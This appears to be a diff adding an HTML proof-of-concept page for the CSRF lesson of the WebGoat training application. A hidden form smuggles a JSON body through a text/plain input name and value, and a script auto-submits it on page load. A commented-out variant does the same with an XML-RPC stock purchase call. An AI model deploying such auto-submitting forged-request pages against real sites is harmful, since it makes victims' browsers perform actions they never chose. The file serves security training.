@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<body>
+<!--
+	POST /csrf/feedback/message HTTP/1.1
+
+	{
+	  "name"    : "WebGoat",
+	  "email"   : "webgoat@webgoat.org",
+	  "content" : "WebGoat is the best!!"
+	}
+-->
+
+<form
+	name="postform"
+	method="post"
+	action="http://localhost:8080/WebGoat/csrf/feedback/message/"
+	enctype="text/plain">
+	
+	<input 
+		type="hidden" 
+		name='
+		{
+			"name":"WebGoat",
+			"email":"webgoat@webgoat.org",
+			"content":"WebGoat is the best!!",
+			"subject":"service'
+		value='"}'>
+<!--
+	<input type="submit" name="submit">
+
+<input 
+	type="hidden" 
+	name='<?xml version'
+	value='"1.0"?><methodCall><methodName>stocks.buy</methodName><params><param><value><string>MSFT</string></value></param><param><value><double>26</double></value></param></params></methodCall>'>
+-->
+</form>
+
+<script type="text/javascript">
+	document.postform.submit();
+</script>
+
+</body>
+</html> 
